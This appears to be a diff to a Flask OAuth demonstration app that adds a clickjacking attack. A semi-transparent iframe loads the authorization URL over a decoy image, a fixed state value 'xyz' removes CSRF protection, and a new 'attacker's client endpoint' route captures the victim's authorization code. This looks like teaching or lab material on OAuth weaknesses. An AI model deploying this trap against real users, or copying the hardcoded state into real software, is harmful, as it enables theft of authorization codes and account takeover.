@@ -27,10 +27,8 @@ def index():
 def connect():
     test = session.get('user')
     tok = str(tokens)
-    if tokens.get(session.get('user')):
-        return redirect(url_for('printer'))
     redirect_uri = url_for('callback', _external=True)
-    return oauth.toyas.authorize_redirect(redirect_uri)
+    return oauth.toyas.authorize_redirect(redirect_uri, state="xyz")
 
 @app.route('/callback')
 def callback():
@@ -54,13 +52,20 @@ def printer():
     
     return render_template('printer.html', images=images)
 
-
+# This HTML could be served by a any server 
 @app.route('/clickjacking')
 def iframe():
-    url = oauth.toyas.create_authorization_url(url_for('callback', _external=True))
+    url = oauth.toyas.create_authorization_url(url_for('click_callback', _external=True), state="xyz")
     return '<iframe style="position: absolute; top: 0; left: 0;  z-index: 1; opacity: 0.5;"' \
-    +'src="'+ url['url']+url['state']+'''" width="400" height="400">
+    +'src="'+ url['url']+'''" width="400" height="400">
     </iframe>
     <img style="position: absolute; top: 0; left: 0; z-index: -1;" 
-    src=https://i.redd.it/esnsxmdd5le51.jpg width="400" height="400">
+    src=/static/clickjacking.png width="400" height="400">
     '''
+
+# This should be an attacker's client endpoint
+@app.route('/click_callback')
+def click_callback():
+    code = request.args.get('code')
+    return "I'm a bad guy and now I have your auth code: "+str(code)
+
